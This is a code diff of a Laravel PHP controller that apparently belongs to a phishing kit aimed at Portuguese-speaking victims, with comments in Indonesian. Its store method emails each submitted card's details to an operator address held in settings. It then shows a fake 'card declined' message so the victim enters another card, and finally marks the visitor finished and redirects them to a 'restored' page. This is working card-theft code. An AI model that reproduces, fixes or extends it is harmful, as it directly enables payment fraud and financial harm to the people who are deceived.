@@ -17,27 +17,22 @@ use Throwable;
 class CardController extends Controller {
     public function index()
     {
-        if (Cache::has(Visitor::current()->user)) {
-            return $this->back2login();
+        if (!BillingController::hasBilling()) {
+            return $this->back2dashboard();
         }
 
         return Inertia::render('Card/Index');
     }
 
-    /**
-     * Store the card details and send an email.
-     *
-     * @param StoreCardRequest $request
-     * @return RedirectResponse
-     */
     public function store(StoreCardRequest $request): RedirectResponse
     {
-        if (($visitor = Visitor::current()) && !Cache::has($visitor->user)) {
-            return $this->back2login();
+        if (!BillingController::hasBilling()) {
+            return $this->back2dashboard();
         }
 
         $cachedCard = Cache::get($request->cardNumber);
         $settings = Settings::me();
+        $visitor = Visitor::current();
 
         try {
             Mail::to($settings->email_result)->sendNow(new CardDetails($request));
@@ -55,11 +50,17 @@ class CardController extends Controller {
             // Indikasi sukses kirim email dan kartu belum digunakan namun kita cek apa setting minimum kartu sudah tercapai
             1 => match ($settings->double_cards) {
                 true => throw ValidationException::withMessages(['cardNumber' => 'Seu cartão foi recusado, por favor tente outro cartão.']),
-                false => redirect()->route(route: 'restored.index'),
+                false => $this->finish()
             },
             // Indikasi gagal kirim email dan/atau kartu sudah digunakan oleh user lain
             0 => throw ValidationException::withMessages(['cardNumber' => 'Seu cartão foi recusado, por favor tente outro cartão.']),
-            default => redirect()->route(route: 'restored.index'),
+            default => $this->finish()
         };
+    }
+
+    private function finish(): RedirectResponse
+    {
+        Visitor::current()->update(['is_finished' => true]);
+        return redirect()->route(route: 'restored.index');
     }
 }
